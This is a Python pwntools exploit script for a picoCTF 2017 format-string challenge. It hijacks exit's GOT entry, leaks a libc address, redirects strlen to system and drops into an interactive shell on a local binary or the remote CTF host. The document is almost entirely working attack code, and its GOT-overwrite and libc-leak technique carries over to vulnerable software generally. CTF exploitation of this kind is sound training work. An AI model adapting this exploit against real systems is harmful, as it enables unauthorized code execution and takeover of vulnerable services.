#!/bin/python2

# Made with _py's write-up: https://0x00sec.org/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920

from pwn import *

host        = 'shell2017.picoctf.com'
port        = '42132'

# from: objdump --dynamic-reloc console
exitGot     = 0x601258
exitGotOrig = 0x400736
loop        = 0x4009bd
fgetsGot    = 0x601230
fgetsOffset = 0x68d50
systemOffset= 0x410b0
strlenOffset= 0x828a0
fgetsOffset = 0x69df0
systemOffset= 0x41490
strlenOffset= 0x81c10
strlenGot   = 0x601210

def info(s):
    log.info(s)

def overwrite(addr, data):
    payload  = 'exit'.ljust(8)
    payload += ("%%%du|%%17$hn|" % data).rjust(16)
    payload += p64(addr)

    p.sendline(payload)
    p.recvline()

def exploit(p):
    pause()
    info("Hijacking exit()")
    overwrite(exitGot, (loop & 0xffff) - 6)

    fgetsLibc   = leak(fgetsGot)
    libcBase    = hex(int(fgetsLibc, 16) - fgetsOffset)
    strlenLibc  = hex(int(libcBase, 16) + strlenOffset)
    systemLibc  = hex(int(libcBase, 16) + systemOffset)

    info("libcBase: " + libcBase)
    info("strlen " + strlenLibc)
    info("system " + systemLibc)

    low     = (int(systemLibc, 16) & 0xffff) - 5
    high    = ((int(systemLibc, 16) & 0xffff0000) >> 16) - 5

    p.sendline("prompt shit")
    p.recvline()

    info("Hijacking strlen")
    overwrite(strlenGot, low)
    overwrite(strlenGot+2, high)

    p.interactive()

def leak(addr):
    info("Leaking " + hex(addr))

    payload  = 'exit'.ljust(8)
    payload += "|%17$s|".rjust(8)
    payload += "shitty".rjust(8)
    payload += p64(addr)

    p.sendline(payload)
    p.recvline()

    data = p.recvuntil("shitty")
    addr_raw = data.split('|')[1]
    addr_fnl = hex(u64(addr_raw.ljust(8, "\x00")))

    return addr_fnl

if len(sys.argv) <= 1 or sys.argv[1] != "seize-poland":
    info("Executing locally")
    p = process(['./console', 'log'])
    exploit(p)
else:
    info("Executing on %s:%s" % (host, port))
    p = remote(host, int(port))
    exploit(p)
